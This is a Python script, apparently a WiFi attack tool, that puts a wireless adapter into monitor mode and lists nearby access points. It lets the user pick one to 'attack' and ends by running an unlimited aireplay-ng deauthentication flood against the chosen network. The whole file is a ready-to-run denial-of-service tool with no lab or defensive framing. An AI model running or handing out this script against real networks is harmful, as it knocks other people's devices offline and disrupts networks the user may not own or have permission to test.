import scapy
import colorama
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE ='\033[94m'
print(bcolors.RED + 'Make Sure Your using Kali Linux Or Other Linux Distros!')
time.sleep(2)
active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Basic user interface header
print(r"""██╗███╗   ██╗██╗   ██╗██╗███████╗██╗██████╗ ██╗     ███████╗""")
print(r"""██║████╗  ██║██║   ██║██║██╔════╝██║██╔══██╗██║     ██╔════╝""")
print(r"""██║██╔██╗ ██║██║   ██║██║███████╗██║██████╔╝██║     █████╗  """)
print(r"""██║██║╚██╗██║╚██╗ ██╔╝██║╚════██║██║██╔══██╗██║     ██╔══╝  """)
print(r"""██║██║ ╚████║ ╚████╔╝ ██║███████║██║██████╔╝███████╗███████╗""")
print(r"""╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝""")
print(r"""                                                            """)
print("\n****************************************************************")
print("\n* Copyright of Invisible3444 & David Bombai, 2021                              *")
print("\n* https://github.com/G00Dway                           *")
print("\n* Credits | G00Dway & David Bombai                         *")
print("\n****************************************************************")



if not 'SUDO_UID' in os.environ.keys():
    print(bcolors.BLUE + "Try running this program with sudo.")
    exit()


for file_name in os.listdir():
    if ".csv" in file_name:
        print(bcolors.RED + "There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        # We get the current working directory.
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/backup/")
        except:
            print(bcolors.YELLOW + "Backup folder exists.")
        # Create a timestamp
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)


wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())


if len(check_wifi_result) == 0:
    print(bcolors.RED + "Please connect a WiFi adapter and try again.")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input(bcolors.BLUE + "Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print(bcolors.BLUE + "Please enter a number that corresponds with the choices available.")

# For easy reference we call the selected interface hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]


print("WiFi adapter connected!\nNow let's kill conflicting processes:")


kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitor mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # This will run multiple times and we need to reset the cursor to the beginning of the file.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                            # We are not interested in the client data.
                            elif row["BSSID"] == "Station MAC":
                                break
                            # Every field where an ESSID is specified will be added to the list.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print(bcolors.RED + "Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print(bcolors.GREEN + "No |\tBSSID              |\tChannel|\tESSID                         |")
        print(bcolors.GREEN + "___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Ensure that the input choice is valid.
while True:
    choice = input(bcolors.YELLOW + "Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print(bcolors.RED + "Please try again.")


hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()


subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

# User will need to use control-c to break the script.
